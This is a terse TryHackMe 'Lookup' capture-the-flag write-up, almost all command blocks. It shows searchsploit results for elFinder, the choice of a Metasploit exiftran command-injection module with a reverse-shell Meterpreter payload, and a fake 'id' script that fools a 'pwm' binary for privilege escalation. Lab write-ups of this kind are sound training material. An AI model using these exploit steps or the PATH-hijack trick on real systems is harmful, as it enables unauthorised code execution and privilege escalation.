---
title: "THM Series: Lookup Writeup"
categories: [Cybersecurity, Hacking]
tags: [CTF, TryHackme, Hacking]
date: 2025-02-03 18:00:00 -0500
math: false
mermaid: true
pin: true
image:
  path: assets/img/THM/THMlogo.png
---
---

On this article we'll explore the Lookup Challenge of Try Hack Me.

```bash
searchsploit elfinder
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                         |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
elFinder 2 - Remote Command Execution (via File Creation)                                                                                                                                              | php/webapps/36925.py
elFinder 2.1.47 - 'PHP connector' Command Injection                                                                                                                                                    | php/webapps/46481.py
elFinder PHP Connector < 2.1.48 - 'exiftran' Command Injection (Metasploit)                                                                                                                            | php/remote/46539.rb
elFinder Web file manager Version - 2.1.53 Remote Command Execution                                                                                                                                    | php/webapps/51864.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

```bash
 msfconsole -q
msf6 > search elfinder

Matching Modules
================

   #  Name                                                               Disclosure Date  Rank       Check  Description
   -  ----                                                               ---------------  ----       -----  -----------
   0  exploit/multi/http/builderengine_upload_exec                       2016-09-18       excellent  Yes    BuilderEngine Arbitrary File Upload Vulnerability and execution
   1  exploit/unix/webapp/tikiwiki_upload_exec                           2016-07-11       excellent  Yes    Tiki Wiki Unauthenticated File Upload Vulnerability
   2  exploit/multi/http/wp_file_manager_rce                             2020-09-09       normal     Yes    WordPress File Manager Unauthenticated Remote Code Execution
   3  exploit/linux/http/elfinder_archive_cmd_injection                  2021-06-13       excellent  Yes    elFinder Archive Command Injection
   4  exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection  2019-02-26       excellent  Yes    elFinder PHP Connector exiftran Command Injection

msf6 > use 4
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
```

```bash
cat id
#!/bin/bash
echo "uid=33(think) gid=33(think) groups=33(think)"
```

```bash
pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: think
```
